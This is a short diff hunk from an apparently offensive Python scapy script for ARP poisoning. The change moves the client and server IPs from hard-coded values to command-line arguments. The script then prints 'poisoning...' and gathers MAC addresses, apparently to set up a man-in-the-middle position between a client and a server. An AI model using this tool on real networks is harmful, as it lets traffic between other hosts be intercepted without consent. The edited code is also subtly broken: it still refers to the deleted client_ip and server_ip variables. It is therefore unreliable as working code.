@@ -1,11 +1,14 @@
 from scapy.all import *
 import time
 import threading
+import argparse
 
+parser = argparse.ArgumentParser(description = "Enter client and server ip.")
+parser.add_argument("client_ip", help = "client ip address")
+parser.add_argument("server_ip", help = "server ip address")
+args = parser.parse_args()
 print("poisoning...")
-my_ip = "10.0.0.1"
-client_ip = "10.0.0.2"
-server_ip = "10.0.0.3"
+
 broadcast = "ff:ff:ff:ff:ff:ff"
 my_mac = get_if_hwaddr("eth0")
 server_mac = getmacbyip(server_ip)
